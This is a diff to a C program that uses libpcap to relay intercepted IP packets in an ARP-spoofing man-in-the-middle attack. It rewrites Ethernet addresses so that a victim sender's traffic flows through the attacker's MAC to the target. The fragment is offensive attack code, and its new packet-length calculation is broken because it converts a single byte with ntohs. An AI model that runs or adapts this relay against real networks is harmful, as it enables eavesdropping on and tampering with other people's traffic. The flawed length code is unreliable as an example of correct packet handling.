@@ -21,6 +21,8 @@ int main(int argc, char* argv[]) {
     char attack_ip[50];    
     char attack_mac[20];
     uint8_t attack_mac_conv[6];
+    unsigned int tmp[6];
+                
     
     time_t checkpoint, current;
     int i;
@@ -36,7 +38,8 @@ int main(int argc, char* argv[]) {
     
     get_attacker_ip(attack_ip, argv[1]);
     get_attacker_mac(attack_mac, argv[1]);
-    sscanf(attack_mac, "%02x:%02x:%02x:%02x:%02x:%02x", &attack_mac_conv[0], &attack_mac_conv[1], &attack_mac_conv[2], &attack_mac_conv[3], &attack_mac_conv[4], &attack_mac_conv[5]);
+    sscanf(attack_mac, "%02x:%02x:%02x:%02x:%02x:%02x", &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]);
+    for(int i = 0; i < 6; i++) attack_mac_conv[i] = (uint8_t) tmp[i];
     
     int cnt = 1;
     while (1) {
@@ -73,42 +76,33 @@ int main(int argc, char* argv[]) {
                 uint8_t current_dest_ip[4];
                 uint8_t current_src_ip[4];
                
-                for(i = 0; i < 4; i++) {
-                    current_dest_ip[i] = rcv_packet[30+i];
-                    current_src_ip[i] = rcv_packet[26+i];
-                }
+                for(i = 0; i < 4; i++) current_src_ip[i] = rcv_packet[26+i];
                 
                 bool control_flag = false;
                 for (i = 0; i < (argc / 2 - 1); i++) {
-                    if (check_packet(sender_ip[i], current_src_ip) == 1 && check_packet(target_ip[i], current_dest_ip) == 1) {
+                    if (check_packet(sender_ip[i], current_src_ip)) {
                         control_flag = true;
                         break;
                     }
                 }
-                if (!control_flag) {
-                    printf("continue\n");
-                    continue;
-                }
+                if (!control_flag) continue;
 
                 uint8_t dest_mac[6];
-                sscanf(target_mac[i], "%02x:%02x:%02x:%02x:%02x:%02x", &dest_mac[0], &dest_mac[1], &dest_mac[2], &dest_mac[3], &dest_mac[4], &dest_mac[5]);
+                sscanf(target_mac[i], "%02x:%02x:%02x:%02x:%02x:%02x", &tmp[0], &tmp[1], &tmp[2], &tmp[3], &tmp[4], &tmp[5]);
+                for (i = 0; i < 6; i++) dest_mac[i] = (uint8_t) tmp[i];
             
                 for (i = 0; i < 6; i++) {
                     rcv_packet[i] = dest_mac[i];
                     rcv_packet[6+i] = attack_mac_conv[i];
                 }
-                int res = pcap_sendpacket(handle, rcv_packet, sizeof(rcv_packet));
-                if (res != 0) {
-                    fprintf(stderr, "Send ARP packet error!\n");
+                int iphdr_len = ntohs((uint16_t)rcv_packet[16]);
+                int res2 = pcap_sendpacket(handle, rcv_packet, iphdr_len + Ethhdr_Len);
+                if (res2 != 0) {
+                    fprintf(stderr, "Send IP packet error!\n");
                 }
+                break;
             }
         }
-
-
-
-        // timestamp value
-        // re infection for each time period.
-        // receive packet. if IP packet and match with sender, relay to target.
     }
 
     pcap_close(handle);    
